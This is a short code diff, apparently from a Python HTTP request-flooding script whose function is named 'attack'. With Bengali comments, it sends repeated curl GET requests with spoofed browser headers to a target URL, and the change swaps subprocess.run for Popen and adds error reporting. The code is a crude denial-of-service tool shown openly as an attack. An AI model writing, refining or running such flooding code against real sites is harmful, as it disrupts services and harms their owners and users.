@@ -30,10 +30,18 @@ def attack(url, total_requests):
                 "Accept-Encoding": "gzip, deflate, br",
                 "Connection": "keep-alive",
             }
+
             # curl কমান্ডে হেডারস যুক্ত করা
-            result = subprocess.run(["curl", "-X", "GET", url] + [f"-H {k}: {v}" for k, v in headers.items()],
-                                    capture_output=True, text=True)
-            print(f"🔥 {url} এ অ্যাটাক পাঠানো হয়েছে")
+            curl_command = ["curl", "-X", "GET", url] + [f"-H {k}: {v}" for k, v in headers.items()]
+            result = subprocess.Popen(curl_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+
+            # রেসপন্স আনা
+            stdout, stderr = result.communicate()
+
+            if result.returncode == 0:
+                print(f"🔥 {url} এ অ্যাটাক পাঠানো হয়েছে")
+            else:
+                print(f"❌ ব্যর্থ: {stderr.decode()}")
             time.sleep(0.5)
         except Exception as e:
             print(f"❌ ব্যর্থ: {e}")
